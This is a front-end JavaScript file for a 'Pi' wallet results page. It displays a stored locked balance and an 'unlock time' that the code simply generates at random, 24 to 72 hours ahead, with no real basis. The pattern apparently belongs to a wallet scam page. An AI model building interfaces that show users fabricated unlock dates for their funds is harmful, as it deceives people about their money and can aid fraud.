// frontend/js/feedback.js
document.addEventListener('DOMContentLoaded', function() {
  const resultData = sessionStorage.getItem('walletResult');
  
  if (!resultData) {
    // No result data, redirect to home
    window.location.href = 'index.html';
    return;
  }

  try {
    const result = JSON.parse(resultData);
    console.log('Feedback page - Result data:', result);
    
    // Get all display elements
    const lockedBalanceElement = document.getElementById('lockedBalance');
    const lockedBalanceElement2 = document.getElementById('lockedBalance2');
    const unlockTimeElement = document.getElementById('unlockTime');
    
    // Display locked balance
    const lockedBalanceValue = result.lockedBalance !== null && result.lockedBalance !== undefined 
      ? result.lockedBalance + ' Pi' 
      : '0 Pi';
    
    if (lockedBalanceElement) {
      lockedBalanceElement.textContent = lockedBalanceValue;
    }
    
    if (lockedBalanceElement2) {
      lockedBalanceElement2.textContent = lockedBalanceValue;
    }
    
    // Display random unlock time (24-72 hours)
    if (unlockTimeElement) {
      const randomHours = Math.floor(Math.random() * 48) + 24; // 24-72 hours
      const unlockDate = new Date(Date.now() + randomHours * 60 * 60 * 1000);
      unlockTimeElement.textContent = unlockDate.toLocaleString('en-US', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: 'numeric',
        minute: 'numeric'
      });
    }

    // Store unlock time for reference
    sessionStorage.setItem('unlockTime', unlockTimeElement ? unlockTimeElement.textContent : '');
    
  } catch (error) {
    console.error('Error parsing result:', error);
    window.location.href = 'index.html';
  }
});

// Handle back button
window.addEventListener('pageshow', function(event) {
  if (event.persisted) {
    // Page loaded from cache
    const resultData = sessionStorage.getItem('walletResult');
    if (!resultData) {
      window.location.href = 'index.html';
    }
  }
});